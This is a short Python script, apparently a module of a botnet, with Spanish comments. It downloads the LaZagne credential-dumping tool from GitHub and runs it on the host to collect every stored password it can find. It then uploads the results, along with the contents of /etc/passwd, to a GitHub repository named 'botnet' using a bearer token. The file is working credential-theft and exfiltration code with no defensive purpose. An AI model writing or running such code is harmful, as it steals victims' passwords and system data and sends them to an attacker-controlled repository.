import subprocess
import requests
import base64
import os

def downloadFile(urlb, token, path):
    print('[!] Descargando ' + urlb)
    headers = {
        'Authorization': 'Bearer ' + token
    }
    res = requests.get(urlb, headers=headers).json()
    if isinstance(res, list):  # Si la respuesta es una lista, significa que es un directorio
        for file_info in res:
            if file_info['type'] == 'file':  # Si es un archivo, lo descargamos
                print('[!] Descargando archivo ' + file_info['name'])
                download_url = file_info['download_url']
                file_content = requests.get(download_url).content
                with open(os.path.join(path, file_info['name']), 'wb') as f:
                    f.write(file_content)
            elif file_info['type'] == 'dir':  # Si es un directorio, lo exploramos
                print('[!] Explorando directorio ' + file_info['name'])
                new_path = os.path.join(path, file_info['name'])
                os.makedirs(new_path, exist_ok=True)
                downloadFile(file_info['url'], token, new_path)
    else:
        print('[-] ' + res.get('message', 'Error desconocido'))

def uploadToGithub(filename, content, token):
    print('[!] Subiendo ' + filename + ' a GitHub')
    data = {
        "message": "Add " + filename,
        "content": base64.b64encode(content.encode('utf-8')).decode('utf-8')
    }
    url = "https://api.github.com/repos/Pol-Ruiz/botnet/contents/" + filename
    headers = {
        'Authorization': 'Bearer ' + token
    }
    res = requests.put(url, headers=headers, json=data)
    if res.status_code == 201:
        print('[!] ' + filename + ' ha sido subido a GitHub exitosamente.')
    else:
        print('[-] Hubo un error al subir ' + filename + ' a GitHub.')

def catAndUpload(filename, token):
    # Leer el contenido del archivo con subprocess
    result = subprocess.run(["cat", filename], capture_output=True, text=True)
    content = result.stdout

    # Guardar el contenido en output.txt
    output_filename = 'output.txt'
    with open(output_filename, 'a') as f:  # Cambiamos 'w' por 'a' para agregar al archivo en lugar de sobrescribirlo
        f.write("\n#cat " + filename + "\n")  # Agregamos un separador antes del contenido del archivo
        f.write(content)

    # Subir output.txt a GitHub
    uploadToGithub(output_filename, content, token)

def run(token):
    urlb = "https://api.github.com/repos/AlessandroZ/LaZagne/contents/Linux/"
    path = 'Linux'
    
    # Verificar si la carpeta ya existe
    if not os.path.exists(path):
        os.makedirs(path, exist_ok=True)
        # Descargar el directorio
        downloadFile(urlb, token, path)
    
    # Ejecutar el archivo con el argumento "all"
    print('[!] Ejecutando laZagne.py')
    result = subprocess.run(["python3", os.path.join(path, 'laZagne.py'), "all"], capture_output=True, text=True)
    
    # Eliminar output.txt si existe
    output_filename = 'output.txt'
    if os.path.exists(output_filename):
        os.remove(output_filename)

    # Guardar la salida en un archivo
    with open(output_filename, 'w') as f:
        f.write(result.stdout)

    # Subir el archivo a GitHub
    uploadToGithub(output_filename, result.stdout, token)

    # Leer /etc/hosts y subirlo a GitHub
    catAndUpload('/etc/passwd', token)


